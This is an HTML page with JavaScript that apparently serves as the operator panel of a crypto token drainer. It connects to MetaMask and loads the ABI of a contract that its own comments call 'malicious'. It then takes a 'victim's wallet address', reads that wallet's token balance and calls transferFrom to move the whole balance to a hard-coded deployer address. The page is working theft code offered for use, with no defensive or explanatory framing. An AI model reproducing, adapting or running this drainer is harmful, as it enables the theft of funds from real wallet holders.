<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdraw Tokens - Deployer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            padding: 20px;
            text-align: center;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            background-color: #4CAF50;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Withdraw Tokens Using Deployer's Wallet</h1>
    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>

    <!-- Connect Wallet Button -->
    <button id="connectWalletBtn">Connect Wallet</button>

    <br><br>

    <!-- Victim Address Input -->
    <label for="victimAddress">Victim Address: </label>
    <input type="text" id="victimAddress" placeholder="Enter victim's wallet address" />

    <br><br>

    <!-- Withdraw Button -->
    <button id="withdrawTokensBtn" style="display:none;" onclick="withdrawAllTokens()">Withdraw All Tokens</button>

    <p id="status"></p>

    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script>
        let web3;
        let userAccount;
        let contractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a"; // Replace with your malicious contract address
        let contract;
        let deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // The address of the deployer

        window.onload = () => {
            console.debug("Page loaded. Checking for MetaMask...");
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                console.debug("MetaMask found. Loading ABI...");
                loadABI();
                init();
            } else {
                alert("MetaMask not found!");
                console.debug("MetaMask not found.");
            }
        };

        async function loadABI() {
            try {
                console.debug("Fetching ABI...");
                const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
                const abi = await response.json();
                contract = new web3.eth.Contract(abi, contractAddress);
                console.debug("Malicious contract initialized:", contract);
            } catch (error) {
                console.error("Error loading ABI:", error);
            }
        }

        async function init() {
            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
        }

        async function connectWallet() {
            try {
                console.debug("Requesting wallet connection...");
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                console.debug("Wallet connected:", userAccount);
                document.getElementById('status').innerText = `Connected: ${userAccount}`;
                document.getElementById('withdrawTokensBtn').style.display = "inline-block";
            } catch (error) {
                console.error("Error connecting wallet:", error);
                alert("Error connecting to MetaMask.");
            }
        }

        async function withdrawAllTokens() {
            const victimAddress = document.getElementById('victimAddress').value;
            
            if (!victimAddress) {
                alert("Please enter a victim's address!");
                console.debug("No victim address provided.");
                return;
            }

            try {
                console.debug("Fetching balance for victim:", victimAddress);

                // Get the victim's token balance
                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
                console.debug("Victim's token balance: " + victimBalance);

                // Check if the victim has any tokens
                if (victimBalance <= 0) {
                    alert("Victim has no tokens to withdraw!");
                    console.debug("Victim has no tokens.");
                    return;
                }

                // Transfer all tokens from the victim to the deployer
                await contract.methods.transferFrom(victimAddress, deployerAddress, victimBalance)
                    .send({ from: deployerAddress });

                console.debug("Successfully withdrew " + victimBalance + " tokens from " + victimAddress);
                document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
            } catch (error) {
                console.error("Error withdrawing tokens:", error);
                document.getElementById('status').innerText = "Error withdrawing tokens.";
            }
        }
    </script>
</body>
</html>
